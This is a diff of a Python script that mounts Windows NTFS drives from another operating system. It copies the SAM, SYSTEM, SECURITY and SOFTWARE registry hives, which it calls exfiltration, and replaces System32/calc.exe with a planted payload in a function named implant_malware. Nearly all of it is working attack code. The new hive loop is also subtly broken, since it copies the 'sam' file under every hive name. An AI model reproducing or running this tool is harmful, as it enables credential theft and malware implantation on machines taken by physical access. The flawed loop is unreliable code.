@@ -6,7 +6,6 @@
 # file systems to mount and then exfils data. Only looks for NTFS 
 #and exfils the calc.exe program for now.
 
-#maybe import os?
 
 import sys, subprocess, argparse, time, shutil, os, datetime
 
@@ -31,6 +30,9 @@ class Drive:
             return 'yes'
         else:
             return 'no'
+
+
+
 
 #Run the command sudo blkid and then recieve its output as a bytes
 #Decode using utf-8 and then split on \n
@@ -69,44 +71,41 @@ def mount_drive(drive):
             '/mnt/windows'.format(drive.get_source()), shell=True)
     time.sleep(1)
 
+def locate_hives():
+    raw_targets = os.listdir('/mnt/windows/Windows/System32/config')
+    targets = []
+    for target in raw_targets:
+        if 'sam' == target.casefold():
+            targets.append(target)
+        elif 'system' == target.casefold():
+            targets.append(target)
+
+        elif 'security' == target.casefold():
+            targets.append(target)
+        elif 'software' == target.casefold():
+            targets.append(target)
+    return targets
+
 def copy_winpayload():
     # gotta use the mount point made by mount_drive here from the 
     # user input i should implement some code that suggests a drive 
     # to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
-
+    
+    target_hives = locate_hives()
     stamp = str(datetime.datetime.now().timestamp())
     directory = '{}/hives_{}'.format(os.getcwd(), stamp[:10])
     os.mkdir(directory) 
+    
+    for hive in target_hives:
+        try:
+            shutil.copyfile('/mnt/windows/Windows/System32/config/sam', 
+                    '{}/{}'.format(directory, hive))
+        except FileNotFoundError as e:
+            print('{} not found'.format(hive))
 
-    try:
-        shutil.copyfile('/mnt/windows/Windows/System32/config/sam', 
-                '{}/sam'.format(directory))
-    except FileNotFoundError as e:
-        print('sam not found')
-
-    try:
-        shutil.copyfile('/mnt/windows/Windows/System32/config/system',
-                '{}/system'.format(directory))
-    except FileNotFoundError as e:
-        print('system not found')
-
-    try:
-        shutil.copyfile('/mnt/windows/Windows/System32/config/security', 
-                '{}/security'.format(directory))
-    except FileNotFoundError as e:
-        print('security not found')
-    try:
-        shutil.copyfile('/mnt/windows/Windows/System32/config/software',
-                '{}/software'.format(directory))
-    except FileNotFoundError as e:
-        print('software not found')
-        
-        # subprocess.Popen('sudo cp /media/windows/hyberfil.sys' 
-        # '/home/galactic_t0ast/Desktop/hyberfil.sys', shell=True)
     print('registry hives have been succesfully exfiltrated to your pwd')
-
-    #optimize this...
+    # optimize this...
     time.sleep(1)
     subprocess.Popen('sudo umount /mnt/windows', shell=True)
     print('Drive has been unmounted from /mnt/windows')
@@ -148,7 +147,7 @@ def check_for_windrives(raw_drives):
                 '===============\nplease choose a drive to exploit.'
                 ' Note drives start at 0\n\nDrive ')
         print('****************************************************'
-                '****')
+                '*****************************************')
         print('Targeting: ' + raw_win_drives[int(target)])
         mount_drive(win_drives[int(target)])
         return True
@@ -157,15 +156,15 @@ def implant_malware():
     try:
         # I need to implemnt something instead of hardcoding 
         # /media/windows
-        shutil.copyfile('/mnt/windows/Windows/System32/calc.exe', 
-                '/mnt/windows/Windows/System32/calc.exe.bak')
+        shutil.copyfile('/media/windows/Windows/System32/calc.exe', 
+                '/media/windows/Windows/System32/calc.exe.bak')
         shutil.copyfile('/calc.exe', 
-                '/mnt/windows/Windows/System32/')
+                '/media/windows/Windows/System32/')
         print('[*] payload has been uploaded to the host')
     except FileNotFoundError:
         print('drive not exploitable')
 
-    subprocess.Popen('sudo umount /mnt/windows', shell=True)
+    subprocess.Popen('sudo umount /media/windows', shell=True)
 
 
 
@@ -177,29 +176,29 @@ def pretty_print(drives):
     # out useful data about the given drive.
 
     subprocess.call('cat assets/ascii_art', shell=True)
-    print('\n\n*******************************'
-            '*********************************',
+    print('\n\n\t\t\t    *****************************************'
+            '****************************************************',
             end ='')
-    print('\n***************A TABLE'
-            ' OF ALL CONNECTED DEVICES*****************',
+    print('\n\t\t\t    ***********************************A TABLE'
+            ' OF ALL CONNECTED DEVICES**************************',
             end ='')
-    print('\n*********************************'
-            '*******************************',
+    print('\n\t\t\t    *******************************************'
+            '**************************************************',
             end ='')
-    print('\n Drive Location\t File System\t '
-            '\t Mounted  ',end ='')
+    print('\n\t\t\t    *\t\tDrive Location\t\t\t  File System\t\t\t'
+            'Mounted\t\t*',end ='')
     for drive in drives:
         if len(drive.get_fs()) > 6:
-            print('\n {}\t {}\t '
-                    '\t {}\t'.format(drive.get_source(), 
+            print('\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t   '
+                    '{}\t\t*'.format(drive.get_source(), 
                         drive.get_fs(), drive.is_mounted()), end='')
         elif len(drive.get_fs()) == 4:
-            print('\n {}\t {}  '
-                    '{} '.format(drive.get_source(), 
+            print('\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t\t  '
+                    ' {}\t\t*'.format(drive.get_source(), 
                         drive.get_fs(),
                         drive.is_mounted()), end='')
-    print('\n**********************************'
-            '*******************************',
+    print('\n\t\t\t    *******************************************'
+            '**************************************************',
             end ='\n')
 
 
